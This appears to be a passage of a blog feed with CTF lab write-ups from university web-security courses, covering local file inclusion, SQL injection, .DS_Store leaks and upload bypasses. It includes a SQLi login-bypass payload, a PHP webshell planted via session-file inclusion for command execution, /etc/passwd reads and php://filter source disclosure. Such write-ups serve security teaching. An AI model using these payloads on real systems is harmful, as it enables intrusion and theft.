There&amp;rsquo;s &lt;code>flag.php&lt;/code> but still no flag in there. &lt;code>HEAD&lt;/code> said &lt;code>HEAD is now at a0228bd Remove flag.&lt;/code>
Thus, we can look up the history by the command below.&lt;/p></description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</guid><description>&lt;h1 id="simple-web-0x01lab---hello-from-windows-98">
 Simple Web 0x01(Lab - Hello from Windows 98)
 &lt;a class="anchor" href="#simple-web-0x01lab---hello-from-windows-98">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://windows.ctf.zoolab.org/">https://windows.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;p>Very similar to &lt;a href="https://bernie6401.github.io/nGAjlvyURtOcRBW1XfCfOA">0x07(Lab - &lt;code>HakkaMD&lt;/code>)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 session_start();
 if(isset($_GET[&amp;#39;source&amp;#39;])){
 highlight_file(&amp;#39;./&amp;#39;.$_GET[&amp;#39;source&amp;#39;].&amp;#39;.php&amp;#39;);
 die();
 }
 if(isset($_GET[&amp;#39;name&amp;#39;]) &amp;amp;&amp;amp; $_GET[&amp;#39;name&amp;#39;]!=&amp;#39;&amp;#39;){
 $_SESSION[&amp;#39;name&amp;#39;] = $_GET[&amp;#39;name&amp;#39;];
 header(&amp;#34;Location: /?page=hi.php&amp;#34;);
 die();
 }
 if(!isset($_GET[&amp;#39;page&amp;#39;])){
 header(&amp;#34;Location: /?page=say.php&amp;#34;);
 die();
 }
?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
 &amp;lt;title&amp;gt;Hello from Windows 98&amp;lt;/title&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://unpkg.com/98.css&amp;#34; /&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;style&amp;gt;
 body{
 background: url(&amp;#39;blue.png&amp;#39;);
 background-size: cover;
 display: flex;
 align-items: center;
 justify-content: center;
 height: 100vh;
 margin: 0;
 }
&amp;lt;/style&amp;gt;
&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;window&amp;#34; style=&amp;#34;margin: 32px; width: 500px&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar-text&amp;#34;&amp;gt;
 Hello World..
 &amp;lt;/div&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar-controls&amp;#34;&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Minimize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Maximize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Close&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;div class=&amp;#34;window-body&amp;#34;&amp;gt;
 &amp;lt;?php include($_GET[&amp;#39;page&amp;#39;]);?&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</guid><description>&lt;h1 id="simple-web-0x02lab---ds_store">
 Simple Web 0x02(Lab - &lt;code>.DS_Store&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x02lab---ds_store">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9001/">http://h4ck3r.quest:9001/&lt;/a>&lt;/p>
&lt;h2 id="exploit---ds_store">
 Exploit - &lt;code>.DS_Store&lt;/code>
 &lt;a class="anchor" href="#exploit---ds_store">#&lt;/a>
&lt;/h2>
&lt;p>Clone &lt;code>lijiejie/ds_store_exp&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/lijiejie/ds_store_exp.git
$ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/super_secret_meowmeow.php
[200] http://h4ck3r.quest:9001/index.php
$ cd h4ck3r.quest_9001
$ cat super_secret_meowmeow.php
FLAG{.DS_Store is so annoying lmao}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, must install &lt;code>python 2&lt;/code>, &lt;code>requests&lt;/code>, &lt;code>ds_store&lt;/code> and modify &lt;code>queue&lt;/code>(&lt;code>import queue&lt;/code>→&lt;code>import Queue as queue&lt;/code>)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py2.7 python=2.7
$ conda install -c auto ds_store
$ conda install -c anaconda requests
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bobbyhadz.com/blog/python-no-module-named-queue">python-no-module-named-queue&lt;/a>&lt;/p></description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</guid><description>&lt;h1 id="simple-web-0x03lab---log-me-in--revenge">
 Simple Web 0x03(Lab - Log me in + Revenge)
 &lt;a class="anchor" href="#simple-web-0x03lab---log-me-in--revenge">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8200/">http://h4ck3r.quest:8200/&lt;/a>
Challenge: &lt;a href="http://h4ck3r.quest:8201/">http://h4ck3r.quest:8201/&lt;/a>&lt;/p>
&lt;h2 id="exploit---sqli">
 Exploit - &lt;code>SQLi&lt;/code>
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
&lt;h2 id="revenge-source-code">
 Revenge source code
 &lt;a class="anchor" href="#revenge-source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from flask import Flask, render_template, redirect, request, g, Response
import sqlite3

app = Flask(__name__)


def get_db():
 db = getattr(g, &amp;#39;_database&amp;#39;, None)
 if db is None:
 db = g._database = sqlite3.connect(&amp;#39;/tmp/database.db&amp;#39;)
 db.row_factory = sqlite3.Row
 return db


@app.before_first_request
def init_db():
 cursor = get_db().cursor()
 cursor.execute(&amp;#34;&amp;#34;&amp;#34;
 CREATE TABLE IF NOT EXISTS &amp;#34;admin&amp;#34; (
 &amp;#34;username&amp;#34; TEXT NOT NULL,
 &amp;#34;password&amp;#34; TEXT NOT NULL
 )
 &amp;#34;&amp;#34;&amp;#34;)
 cursor.execute(&amp;#34;SELECT COUNT(*) as count FROM admin WHERE username=&amp;#39;admin&amp;#39;&amp;#34;)
 count = cursor.fetchone()[&amp;#39;count&amp;#39;]
 if count == 0:
 import secrets
 cursor.execute(&amp;#34;INSERT INTO admin (username, password) VALUES (?,?)&amp;#34;,
 (&amp;#39;admin&amp;#39;, secrets.token_urlsafe()))
 get_db().commit()


@app.teardown_appcontext
def close_connection(exception):
 db = getattr(g, &amp;#39;_database&amp;#39;, None)
 if db is not None:
 db.close()


@app.route(&amp;#34;/&amp;#34;)
def home():
 return render_template(&amp;#34;index.html&amp;#34;,
 failed=request.args.get(&amp;#39;failed&amp;#39;) != None)


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 username = request.form.get(&amp;#39;username&amp;#39;)
 password = request.form.get(&amp;#39;password&amp;#39;)

 if not username or not password:
 return redirect(&amp;#34;/?failed&amp;#34;)

 cur = get_db().execute(f&amp;#34;SELECT * FROM admin WHERE (username=&amp;#39;{username}&amp;#39;)&amp;#34;)
 res = cur.fetchone()
 cur.close()

 if res[&amp;#39;username&amp;#39;] == &amp;#39;admin&amp;#39; and res[&amp;#39;password&amp;#39;] == password:
 return &amp;#34;FLAG: FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#34;

 return redirect(&amp;#34;/?failed&amp;#34;)



@app.route(&amp;#34;/source&amp;#34;)
def source():
 import re
 source_code = open(__file__).read()
 source_code = re.sub(r&amp;#39;FLAG{[^}\s]+}&amp;#39;, &amp;#39;FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#39;, source_code, 1)
 return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)


if __name__ == &amp;#39;__main__&amp;#39;:
 app.run(debug=True)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</guid><description>&lt;h1 id="simple-web-0x04lab---image-space-0x01">
 Simple Web 0x04(Lab - Image Space 0x01)
 &lt;a class="anchor" href="#simple-web-0x04lab---image-space-0x01">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9010">http://h4ck3r.quest:9010&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;!-- upload form --&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</guid><description>&lt;h1 id="simple-web-0x05lab---image-space-0x02">
 Simple Web 0x05(Lab - Image Space 0x02)
 &lt;a class="anchor" href="#simple-web-0x05lab---image-space-0x02">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9011">http://h4ck3r.quest:9011&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);

 if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
 die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
 }

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</guid><description>&lt;h1 id="simple-web-0x06lab---image-space-0x03">
 Simple Web 0x06(Lab - Image Space 0x03)
 &lt;a class="anchor" href="#simple-web-0x06lab---image-space-0x03">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9012">http://h4ck3r.quest:9012&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);

 if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
 die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
 }

 if (in_array($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;type&amp;#39;], [&amp;#34;image/png&amp;#34;, &amp;#34;image/jpeg&amp;#34;, &amp;#34;image/jpg&amp;#34;]) === false) {
 die(&amp;#34;Invalid file type: &amp;#34; . $_SERVER[&amp;#34;CONTENT_TYPE&amp;#34;]);
 }

 list($_, $_, $type) = getimagesize($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]);

 if ($type !== IMAGETYPE_JPEG &amp;amp;&amp;amp; $type !== IMAGETYPE_PNG) {
 die(&amp;#34;Invalid image type.&amp;#34;);
 }

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::
It has 2 extra constraint must be bypassed. Use &lt;code>burpsuite&lt;/code> and change valid file signature&lt;/p></description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</guid><description>&lt;h1 id="simple-web-0x07lab---hakkamd">
 Simple Web 0x07(Lab - &lt;code>HakkaMD&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x07lab---hakkamd">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8401">http://h4ck3r.quest:8401&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10241555">資安這條路-Local File Inclusion&lt;/a>&lt;/p>
&lt;h2 id="exploit---lfi-to-rce">
 Exploit - LFI to RCE
 &lt;a class="anchor" href="#exploit---lfi-to-rce">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>First things first, the website has &lt;code>LFI&lt;/code> problem
&lt;code>http://h4ck3r.quest:8401/?module=/etc/passwd&lt;/code>
&lt;img src="https://i.imgur.com/Efl4E0c.png" alt="" />&lt;/li>
&lt;li>&lt;font color="FF0000">&lt;strong>通靈&lt;/strong>&lt;/font>
It provided &lt;code>phpinfo()&lt;/code> so that we can check the save address of session.
&lt;img src="https://i.imgur.com/SO727sY.png" alt="" />
The setting is default, thus we can use &lt;code>LFI&lt;/code> to read session file:
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1&lt;/code>
&lt;img src="https://i.imgur.com/AiLGZJA.png" alt="" />
We can see that session file store the data of what we enter. Therefore, we could enter &lt;code>webshell&lt;/code> to get shell&lt;/li>
&lt;li>&lt;code>webshell&lt;/code>
&lt;code>&amp;lt;?php system($_GET['sh']); ?&amp;gt;&lt;/code>
↓
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=ls%20/&lt;/code>
↓
&lt;img src="https://i.imgur.com/kqlIf6z.png" alt="" />
↓
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=cat%20/flag_aff6136bbef82137&lt;/code>&lt;/li>
&lt;li>Then we got flag!!!&lt;/li>
&lt;/ol></description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</guid><description>&lt;h1 id="simple-web-0x08lab---my-first-meow-website">
 Simple Web 0x08(Lab - My First Meow Website)
 &lt;a class="anchor" href="#simple-web-0x08lab---my-first-meow-website">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8400/">http://h4ck3r.quest:8400/&lt;/a>
Target: Login as Admin&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10245020">PHP 偽協議 (一) &lt;/a>
&lt;a href="https://youtu.be/_hasOTGximc?t=2855">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Observe
According to the URL, &lt;code>http://h4ck3r.quest:8400/?page=inc/home&lt;/code>, it might have &lt;code>LFI&lt;/code> problem.&lt;/li>
&lt;li>Use &lt;code>php://filter&lt;/code> to read page
&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home&lt;/code>
:::spoiler page source code
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;Meow&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;nav class=&amp;#34;navbar is-dark&amp;#34; role=&amp;#34;navigation&amp;#34; aria-label=&amp;#34;main navigation&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;navbar-brand&amp;#34;&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;🐱&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div id=&amp;#34;navbarBasicExample&amp;#34; class=&amp;#34;navbar-menu&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;navbar-start&amp;#34;&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;
 Home
 &amp;lt;/a&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/about&amp;#34;&amp;gt;
 About
 &amp;lt;/a&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/admin.php&amp;#34;&amp;gt;
 Admin
 &amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/nav&amp;gt;

 &amp;lt;div class=&amp;#34;container&amp;#34; style=&amp;#34;margin-top: 1em;&amp;#34;&amp;gt;
 &amp;lt;?php
 if (isset($_GET[&amp;#39;page&amp;#39;]))
 include($_GET[&amp;#39;page&amp;#39;] . &amp;#34;.php&amp;#34;);
 else
 include(&amp;#34;inc/home.php&amp;#34;);
 ?&amp;gt;
 &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Observe page source code
We know that &lt;code>admin.php&lt;/code> is under &lt;code>/&lt;/code> directory.
&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin&lt;/code>
:::spoiler admin source code
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;h1&amp;gt;Admin Panel&amp;lt;/h1&amp;gt;
&amp;lt;form&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;admin&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;password&amp;#34; name=&amp;#34;password&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php
$admin_account = array(&amp;#34;username&amp;#34; =&amp;gt; &amp;#34;admin&amp;#34;, &amp;#34;password&amp;#34; =&amp;gt; &amp;#34;kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&amp;#34;);
if (
 isset($_GET[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;]) &amp;amp;&amp;amp;
 $_GET[&amp;#39;username&amp;#39;] === $admin_account[&amp;#39;username&amp;#39;] &amp;amp;&amp;amp; $_GET[&amp;#39;password&amp;#39;] === $admin_account[&amp;#39;password&amp;#39;]
) {
 echo &amp;#34;&amp;lt;h1&amp;gt;LOGIN SUCCESS!&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;&amp;#34;.getenv(&amp;#39;FLAG&amp;#39;).&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;;
}

?&amp;gt;
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Then we get admin password is: &lt;code>kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&lt;/code>. Then we got flag!!!&lt;/li>
